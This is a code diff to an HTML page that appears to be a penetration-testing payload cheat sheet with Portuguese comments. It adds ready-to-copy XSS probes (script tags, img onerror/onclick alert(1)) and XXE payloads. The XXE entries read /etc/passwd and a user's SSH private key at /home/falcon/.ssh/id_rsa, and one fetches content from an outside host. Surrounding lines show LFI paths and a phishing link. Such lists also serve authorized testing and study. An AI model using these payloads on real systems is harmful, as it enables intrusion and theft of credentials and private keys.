@@ -113,7 +113,28 @@
         
         <!-- Caixas de texto para cada tipo de payload -->
         <textarea id="xss" class="payload" readonly>
+<h1>
+<b>
+<a>
+<form>
+<img>
+<h1></h1>
+<b></b>
+<a></a>
+<form></form>
+<img/><img>
+<h1>test</h1>
+<b>test</b>
+<a href="#">test</a>
+<script>alert(1)</script>
+<img src="0" onclick="alert(1)"/>
+<img src="0" onerror="alert(1)"/>
+<img src='0' onclick='alert(1)'/>
+<img src='0' onerror='alert(1)'/>
+<img src=0 onclick=alert(1)/>
+<img src=0 onerror=alert(1)/>
 &lt;script&gt;alert('XSS Payload');&lt;/script&gt;
+            
         </textarea>
         <textarea id="lfi" class="payload" readonly>
 ..\WINDOWS\win.ini
@@ -611,6 +632,43 @@ ifconfig
         </textarea>
         <textarea id="xml" class="payload" readonly>
 &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+
+variables
+<?xml version="1.0"?>
+<!DOCTYPE root[
+        <!ENTITY myName "Michal">
+        <!ENTITY mySurname "Szalkowski">
+        ]>
+<root>
+    <text>&myName; &mySurname;</text>
+</root>
+
+webContent
+<?xml version="1.0"?>
+<!DOCTYPE root [ <!ENTITY webContent SYSTEM "http://log.michalszalkowski.com/lorem.txt">]>
+<root>
+    <text>&webContent;</text>;
+</root>
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY webContent SYSTEM "robots.txt">]>
+<root>
+    <text>&webContent;</text>;
+</root>
+fileContent
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY fileContent SYSTEM "/etc/passwd">]>
+<root>&fileContent;</root>
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY fileContent SYSTEM "/home/falcon/.ssh/id_rsa">]>
+<root>&fileContent;</root>
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY fileContent SYSTEM 'file:///etc/passwd'>]>
+<root>
+    <text>&fileContent;</text>
+</root>
         </textarea>
         <textarea id="phishing" class="payload" readonly>
 &lt;a href="http://malicious-site.com"&gt;Click Here to Win a Prize!&lt;/a&gt;
